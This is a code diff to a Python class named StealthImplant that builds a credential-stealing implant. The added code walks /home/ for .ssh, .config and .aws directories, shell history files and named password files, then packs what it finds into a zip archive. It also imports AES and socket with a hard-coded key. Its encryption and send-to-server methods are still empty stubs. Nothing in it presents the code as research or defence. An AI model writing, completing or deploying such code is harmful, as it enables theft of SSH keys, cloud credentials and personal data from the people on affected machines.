@@ -1,5 +1,10 @@
+import os
 from pathlib import Path
 import zipfile
+from io import BytesIO
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import socket
 
 class StealthImplant:
     
@@ -8,7 +13,8 @@ class StealthImplant:
     def __init__(
         self, 
         source="/home/",
-        target_patterns=[
+        # This can be either directory or file
+        target_files=[
             ".ssh", 
             ".config", 
             ".aws", 
@@ -17,22 +23,27 @@ class StealthImplant:
         history_glob=".*_history",
         test=False
     ):
-        if test:
-            print("Implant initialize")
-            print("source", source)
-            print("target", target)
 
-        self.root_dir=Path(source)
-        self.target_patterns=target_patterns
+        self.root_dir=Path(source).expanduser()
+        self.target_files=target_files
         self.history_glob=history_glob
         self.test=test
         self.ignore_dirs = {"lost+found", "cache", "tmp" }
         self.encryption_key = b'16bytessecretkey'  # AES-128
         self.encryption_iv = b'16bytepubliciv!'
+
+        self._log("Implant initialize")
+        self._log(f"source: {source}")
+        self._log(f"target files: {target_files}")
     
     def run(self):
         try:
+            self._log("Running...")
             collected_files=self.walk_dir()
+            self._log(f"successfully retrieve {len(collected_files)} files")
+            zip_bytes = self.create_zip(collected_files)
+            with open("output.zip", "wb") as f:
+                f.write(zip_bytes)
         except Exception as e:
             if self.test:
                 raise
@@ -40,20 +51,46 @@ class StealthImplant:
     # get list of file from source
     # matching target
     def walk_dir(self):
-        target = [] 
-        for user_dir in self.root_dir.iterdir():
-            if user_dir.name in self.ignore_dirs:
-                continue
-            for pattern in self.target_patterns:
-                for file_path in user_dir.rglob(pattern): 
-                    print("found", file_path)
-        return targets
+        collected = [] 
+        for root, dirs, files in os.walk(self.root_dir, followlinks=False):
+            self._log(f"root: {root}")
+            self._log(f"dirs: {dirs}")
+            self._log(f"files: {files}")
+            dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
+            
+            # if current directly is what we are looking for
+            if any(target_dir in root for target_dir in self.target_files):
+                for f in files:
+                    self._log(f"Found: ${Path(root) / f}")
+                    collected.append(Path(root) / f)
+            
+            # if it contains the file we need
+            for f in files:
+                if f in self.target_files:
+                    self._log(f"Found: {Path(root) / f}")
+                    collected.append(Path(root) / f)
+                    
+            if self.history_glob:
+                for f in files:
+                    if Path(f).match(self.history_glob):
+                        self._log(f"Found: {Path(root) / f}")
+                        collected.append(Path(root) / f)
+
+        return list(set(collected))
 
         
     # zip the files we found
-    def zipfile(self):
-        pass
-    
+    def create_zip(self, files):
+        zip_buffer = BytesIO()
+        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
+            for path in files:
+                try:
+                    rel_path = path.relative_to(self.root_dir)
+                    zf.write(path, rel_path)
+                except Exception as e:
+                    self._log(f"skipped {path}: {e}")
+        return zip_buffer.getvalue()
+
     # encrypt the data
     def encrypt(self):
         pass
@@ -62,8 +99,11 @@ class StealthImplant:
     def send_to_server(self):
         pass
 
+    def _log(self, message:str):
+        if self.test: print(message)
+
 def main():
-    implant = StealthImplant(source="test_data", target_patterns=[".txt"])
+    implant = StealthImplant(source="test_data", target_files=["passwords.txt", "users_data.txt"], test=True)
     implant.run()
 
 if __name__ == "__main__":
